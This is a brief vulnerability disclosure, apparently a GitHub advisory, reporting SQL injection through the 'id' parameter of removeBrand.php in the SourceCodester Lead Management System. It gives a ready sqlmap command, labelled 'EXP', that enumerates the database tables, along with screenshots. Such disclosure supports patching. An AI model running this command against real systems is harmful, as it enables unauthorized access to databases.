vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208410479-0fe99b11-a62b-46df-995c-feb6094213e4.png)


EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeBrand.php?id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208410533-34bdbb81-a554-4b38-a8c2-88bd13f2e859.png)
